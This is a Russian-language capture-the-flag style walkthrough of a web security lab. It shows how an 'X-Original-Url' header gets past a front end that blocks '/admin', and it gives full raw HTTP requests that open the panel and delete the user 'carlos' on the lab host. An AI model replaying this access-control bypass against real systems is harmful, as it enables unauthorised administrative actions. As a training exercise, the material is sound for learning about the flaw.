Этот веб-сайт имеет неаутентифицированную панель администратора по адресу `/admin`, но система front-end была настроена на блокировку внешнего доступа к этому пути. Однако приложение back-end построено на фреймворке, который поддерживает `X-Original-URL`заголовок.

Чтобы решить лабораторную работу, войдите в панель администратора и удалите пользователя `carlos`.

## Дано

- веб-сайт имеет неаутентифицированную панель администратора по адресу `/admin`
- имеет блокировку внешнего доступа к этому пути
- поддерживает `X-Original-URL`заголовок
## Задача

- удалить пользователя `carlos`

# Решение 

1. Попробуем зайти по /admin и добавить заголовок `X-Original-URL` с параметром
Убираем `GET /admin HTTP/2` в `GET / HTTP/2` и добавляем `X-Original-Url: /admin`
```
GET / HTTP/2
Host: 0a500034049c875980d5b245004f00b9.web-security-academy.net
X-Original-Url: /admin
Cookie: session=CM5RoUftryAq2OdSQRuf2Xzx2MxoMrvR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a500034049c875980d5b245004f00b9.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```
Получаем ответ 200
![[Pasted image 20250226163407.png]]

Формируем `X-Original-Url: /admin/delete?username=carlos`

Получили ответ что мы так не можем пробуем изменить заголовок url
```
POST /delete?username=carlos HTTP/2
Host: 0a500034049c875980d5b245004f00b9.web-security-academy.net
X-Original-Url: /admin/delete?username=carlos
Cookie: session=CM5RoUftryAq2OdSQRuf2Xzx2MxoMrvR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a500034049c875980d5b245004f00b9.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```
